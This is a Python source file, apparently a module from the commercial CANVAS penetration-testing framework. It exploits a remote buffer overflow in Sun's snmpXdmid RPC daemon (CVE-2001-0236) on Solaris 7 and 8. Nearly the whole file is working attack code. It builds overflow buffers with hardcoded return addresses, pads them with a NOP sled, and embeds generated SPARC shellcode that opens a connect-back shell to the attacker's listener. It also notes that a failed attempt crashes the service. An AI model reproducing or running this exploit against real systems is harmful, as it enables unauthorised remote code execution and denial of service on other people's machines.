#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""
TODO: Add osdetect support to choose the version!

"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: sinan.eren@immunityinc.com
#

import sys
if "." not in sys.path: sys.path.append(".")

from libs import rpc
from libs.rpc import Packer, Unpacker, TCPClient
from libs import xdr
import socket
from exploitutils import *
from tcpexploit import tcpexploit

from libs import ctelnetlib
import struct
import random
import timeoutsocket
import time

NAME="snmpXdmid Buffer Overflow"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="Mar 15, 2001"
DOCUMENTATION["CERT Advisory"]="http://www.kb.cert.org/vuls/id/648304"
DOCUMENTATION["CVE Name"] = "CVE-2001-0236"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0236"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F26981&zone_32=category%3Asecurity%20snmpXdmid"
DOCUMENTATION["Patch Info"]="Solstice Enterprise Agent for Solaris 2.6 with 106787-15 or later\n"+\
"Solaris 7 with patch 107709-15 or later\n"+\
"Solaris 8 with patch 108869-07 or later"
DOCUMENTATION["Development Notes"]="This is a one shot exploit. If the first try fails the process will die and\n"+\
             "needs to be restarted."
DOCUMENTATION["WARNING"]="Due to the nature of this vulnerability, it is hard to achieve reliable exploitation. Service wil crash and will not be restarted."
DOCUMENTATION["WARNING"]="This exploits computes a rather large payload which makes it CPU intensive and slow."

DESCRIPTION="snmpXdmid Buffer Overflow"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris", "sparc", "_i86pc" ] ]

from canvasengine import SOLARISSPARCMOSDEF

class XDMIException(Exception):
    
    def __init__(self, args=None):
        self.args = args
        
    def __str__(self):
        return `self.args`

class XDMI_Packer(Packer):
    
    def pack_addcomponent(self, ra):
        buf1, buf2 = ra
        
        print "Packing the payload, this might take several minutes and consume CPU."
        
        self.pack_uint(0)
        self.pack_bool(0) #XXX: pointer
        self.pack_bool(1)
        self.pack_uint(0)
        self.pack_bool(1)
        
        #overflow vectors
        self.pack_uint(len(buf1))
        for each in buf1:
            self.pack_uint(ord(each))
        
        self.pack_bool(1)
        
        #safeaddr, nope, shellcode
        self.pack_uint(len(buf2))
        for each in buf2:
            self.pack_uint(ord(each))
        
        self.pack_bool(0) #XXX: pointer
        self.pack_uint(0)
        
        print "Done packing payload."
        
class XDMI_Unpacker(Unpacker):
    
    def unpack_addcomponent(self):
        return
    
class XDMI_Client(TCPClient):

    def __init__(self, target):
        self.xdmi_d = { "PROGNUM": 100249, "VERSNUM": 1, "XDMI_ADDCOMPONENT": 257 }
        TCPClient.__init__(self, target, self.xdmi_d["PROGNUM"], self.xdmi_d["VERSNUM"])

    def addpackers(self):
        #print "addpackers()"
        self.packer = XDMI_Packer()
        self.unpacker = XDMI_Unpacker("")

    def mkcred(self):
        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(random.randint(1,99999),\
                                                      "localhost", 0, 0, [])
        return self.cred
    
    def xdmi_addcomponent(self, buf1, buf2):
        return self.make_call(self.xdmi_d["XDMI_ADDCOMPONENT"], (buf1, buf2),\
                              self.packer.pack_addcomponent,\
                              self.unpacker.unpack_addcomponent)
    
class XDMIExploit(XDMI_Client):
    
    def __init__(self, target="", timeout = 10):
        self.tm = timeout
        self.set_target(target)
        
    def set_target(self, ip):
        try:
            self.targethost = socket.gethostbyname(ip)
        except socket.gaierror, err:
            raise XDMIException, "XDMIExploit, Host: " + ip + " " + err[1]

    def get_target(self):
        return self.targethost

    def set_timeout(self, tm):
        self.tm = tm

    def get_timeout(self):
        return self.tm

    def setup(self):
        try:
            XDMI_Client.__init__(self, self.host)
        #except (socket.error, RuntimeError), self.err:
        except:
            raise XDMIException, "Failed to connect to the snmpXdmid daemon"
        
    def xdmi_makesploit(self):
        
        self.expbuf = "" #1600 bytes
        self.scbuf = ""  #128000 bytes
        
        if self.version==1:
            #solaris 8
            self.addr = 0x000cf2c0
            self.safeaddr = self.addr + 32000
            self.retaddr = self.addr + 96000
            self.log("Using safeaddr: 0x%x returnaddr: 0x%x" % (self.safeaddr, self.retaddr))
            self.expbuf = struct.pack(">L", self.safeaddr) * (1248/4)
            self.expbuf += struct.pack(">L", self.retaddr) * (352/4)
        elif self.version==2:
            #solaris 7
            self.addr = 0x000b1868
            self.safeaddr = self.addr + 32000
            self.retaddr = self.addr + 96000
            self.log("Using safeaddr: 0x%x returnaddr: 0x%x" % (self.safeaddr, self.retaddr))
            self.expbuf = struct.pack(">L", self.safeaddr) * (1248/4)
            self.expbuf += struct.pack(">L", self.retaddr) * (352/4)
        else:
            self.log("Error: Version %d not expected!"%self.version)

        self.expbuf += "\x00"
        
        #shellcode len: 288
        self.scbuf = struct.pack(">L", 0) * (64000/4)
        self.scbuf += struct.pack(">L", 0xa41c4011L) * ((64000/4) - (len(self.shellcode)/4))
        self.scbuf += self.shellcode
        self.scbuf += "\x00"
        
    def exploit(self):
        
        #win32 python required the following
        timeoutsocket.setDefaultSocketTimeout(5)
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
        
        self.setup()
        self.xdmi_makesploit()
        try:
            self.xdmi_addcomponent(self.expbuf, self.scbuf)
        except:
            pass
        

        time.sleep(8)
        #check if my shell listener has accepted a connection
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (succeeded!)"%(NAME,self.host,self.port))
            self.log("Succeeded!")
            return 1

        self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
        return 0
        
class theexploit(tcpexploit, XDMIExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x20\x00\\/.:?\r\n%?"
        self.name=NAME
        return

    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Calling back to %s:%s"%(localhost,localport))
        return self.createSparcShellcode(self.badstring, localhost,localport)    
       
    def neededListenerTypes(self):

        return [SOLARISSPARCMOSDEF]
    
    def test(self):       
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface
        try:
            XDMI_Client.__init__(self, self.host)
        except:
            return 0
        self.log("snmpXdmid is running on the remote end.")
        return 1
    
    def run(self):
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface
        try:
            return self.dorun()
        except XDMIException, self.expstr:
            self.log(str(self.expstr))
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        
    def dorun(self):
        self.exploit()
        return
    
    #returns the sploitstring, see xdmi_makesploit
    def makesploit(self):
        pass

    def displayVersions(self):
        print "0 : Automatic (not done)"
        print "1 : Solaris 8 Ultra "
        print "2 : Solaris 7 Ultra "
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
